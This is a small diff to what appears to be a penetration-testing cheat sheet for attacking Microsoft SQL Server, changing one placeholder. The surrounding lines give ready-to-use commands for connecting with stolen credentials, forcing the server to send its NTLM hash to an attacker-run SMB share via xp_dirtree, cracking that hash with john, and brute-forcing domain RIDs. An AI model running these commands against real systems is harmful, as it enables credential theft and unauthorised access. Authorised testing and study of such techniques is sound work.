@@ -871,7 +871,7 @@ impacket-mssqlclient '$DOM'/'$USERNAME':'$PASSWORD'@'$TARGET' -windows-auth
 [###] Coerce Hash + Crack
 impacket-smbserver -smb2support $ /Upload/windows
 sqsh -S $TARGET -U '$DOM\$USERNAME' -P '$PASSWORD' -D master -C "EXEC xp_dirtree '//$MYIP/$';"
-echo 'hash' > hashes; john hashes -w=$rockyou
+echo '$HASH' > hashes; john hashes -w=$rockyou
 
 [###] RID: Brute
 nxc mssql $TARGET -u '$USERNAME' -p '$PASSWORD' --rid-brute
